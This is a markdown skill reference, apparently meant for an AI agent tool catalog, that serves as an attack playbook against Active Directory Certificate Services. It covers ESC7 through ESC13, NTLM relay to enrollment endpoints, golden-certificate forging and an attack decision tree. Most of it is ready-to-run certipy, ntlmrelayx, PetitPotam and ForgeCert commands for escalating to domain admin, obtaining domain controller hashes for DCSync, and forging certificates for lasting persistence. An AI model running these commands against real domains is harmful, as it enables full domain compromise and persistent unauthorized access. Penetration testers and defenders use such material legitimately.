# SKILL: AD CS Attack Playbook — Expert Guide: detailed technique reference

<!-- zhiyugo:resource:start -->
> ZhiyuGo reference material only. Inspect it explicitly through catalog resource tooling when the main Skill names this file; examples do not grant tools, authorization, or evidence.
<!-- zhiyugo:resource:end -->

<!-- zhiyugo:toc:start -->
## Contents

- [8. ESC7 — CA OFFICER / MANAGER PERMISSIONS](#8-esc7-ca-officer-manager-permissions)
- [9. ESC8 — NTLM RELAY TO HTTP ENROLLMENT](#9-esc8-ntlm-relay-to-http-enrollment)
- [10. ESC9-ESC13 — NEWER DISCOVERIES](#10-esc9-esc13-newer-discoveries)
- [11. CERTIFICATE-BASED PERSISTENCE](#11-certificate-based-persistence)
- [12. AD CS ATTACK DECISION TREE](#12-ad-cs-attack-decision-tree)
<!-- zhiyugo:toc:end -->

## 8. ESC7 — CA OFFICER / MANAGER PERMISSIONS

**Condition**: User has ManageCA or ManageCertificates permission on the CA.

```bash
# With ManageCA: enable SubCA template (always allows SAN)
certipy ca -u user@domain.com -p password -ca CA-NAME -dc-ip DC_IP \
  -enable-template SubCA

# Request SubCA cert with admin SAN (will be denied — "pending")
certipy req -u user@domain.com -p password -ca CA-NAME -target CA_HOST \
  -template SubCA -upn administrator@domain.com

# With ManageCertificates: approve the pending request
certipy ca -u user@domain.com -p password -ca CA-NAME -dc-ip DC_IP \
  -issue-request REQUEST_ID

# Retrieve the issued certificate
certipy req -u user@domain.com -p password -ca CA-NAME -target CA_HOST \
  -retrieve REQUEST_ID
```

---

## 9. ESC8 — NTLM RELAY TO HTTP ENROLLMENT

**Condition**: CA has HTTP enrollment endpoint (certsrv) without HTTPS enforcement.

```bash
# Setup relay to enrollment endpoint
ntlmrelayx.py -t http://CA_HOST/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Coerce DC authentication (PetitPotam, PrinterBug, etc.)
PetitPotam.py RELAY_HOST DC01.domain.com

# DC authenticates → relay → certificate issued for DC01$
# Authenticate with certificate
certipy auth -pfx dc01.pfx -dc-ip DC_IP
# → DC01$ hash → DCSync
```

---

## 10. ESC9-ESC13 — NEWER DISCOVERIES

### ESC9: No Security Extension (StrongCertificateBindingEnforcement = 0/1)

Weak certificate mapping allows impersonation when `CT_FLAG_NO_SECURITY_EXTENSION` is set.

```bash
# Change victim's UPN to admin, request cert, change back
certipy shadow auto -u attacker@domain.com -p pass -account victim -dc-ip DC_IP
```

### ESC10: Weak Certificate Mapping (Registry-based)

Similar to ESC9 but exploits `CertificateMappingMethods` registry value on DC.

### ESC11: NTLM Relay to RPC Enrollment

Relay NTLM to the CA's RPC interface (IF_ENFORCEENCRYPTICERTREQUEST not set).

```bash
ntlmrelayx.py -t "rpc://CA_HOST" -rpc-mode ICPR -icpr-ca-name "CA-NAME" \
  -smb2support --adcs --template DomainController
```

### ESC13: OID Group Link (Issuance Policy)

Template's issuance policy OID is linked to a group → certificate grants that group membership.

```bash
certipy req -u user@domain.com -p pass -ca CA-NAME -target CA_HOST \
  -template ESC13Template
# Certificate grants membership in linked group
```

---

## 11. CERTIFICATE-BASED PERSISTENCE

### Golden Certificate

With CA private key → forge any certificate.

```bash
# Extract CA private key (requires admin on CA server)
certipy ca -backup -u admin@domain.com -p password -ca CA-NAME -target CA_HOST

# Forge certificate for any user
certipy forge -ca-pfx ca.pfx -upn administrator@domain.com -subject "CN=Administrator,CN=Users,DC=domain,DC=com"

# Authenticate with forged cert
certipy auth -pfx forged.pfx -dc-ip DC_IP
```

**Persistence**: Valid until CA certificate expires or CA private key is rotated.

### ForgeCert (Windows)

```cmd
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword "pass" --Subject "CN=User" \
  --SubjectAltName "administrator@domain.com" --NewCertPath forged.pfx --NewCertPassword "pass"
```

---

## 12. AD CS ATTACK DECISION TREE

```
Targeting AD CS
│
├── Enumerate: certipy find -vulnerable
│
├── Vulnerable template found?
│   ├── Enrollee can set SAN + Client Auth EKU?
│   │   └── ESC1 → request cert with admin UPN (§3)
│   ├── Any Purpose EKU?
│   │   └── ESC2 → same as ESC1 (§4)
│   ├── Enrollment Agent template available?
│   │   └── ESC3 → enroll as agent, then on-behalf-of (§5)
│   └── OID group link in issuance policy?
│       └── ESC13 → request cert for group membership (§10)
│
├── Write access to template?
│   └── ESC4 → modify template to ESC1 condition (§6)
│
├── CA misconfiguration?
│   ├── EDITF_ATTRIBUTESUBJECTALTNAME2 flag?
│   │   └── ESC6 → any template becomes ESC1 (§7)
│   ├── ManageCA / ManageCertificates permission?
│   │   └── ESC7 → enable SubCA template, approve requests (§8)
│   └── HTTP enrollment without HTTPS?
│       └── ESC8 → NTLM relay to certsrv (§9)
│
├── Weak certificate mapping on DC?
│   ├── StrongCertificateBindingEnforcement < 2?
│   │   └── ESC9 → UPN manipulation + cert request (§10)
│   └── CertificateMappingMethods misconfigured?
│       └── ESC10 → similar UPN abuse (§10)
│
├── RPC enrollment without encryption?
│   └── ESC11 → NTLM relay to RPC (§10)
│
└── Already CA admin?
    └── Golden certificate for persistence (§11)
```
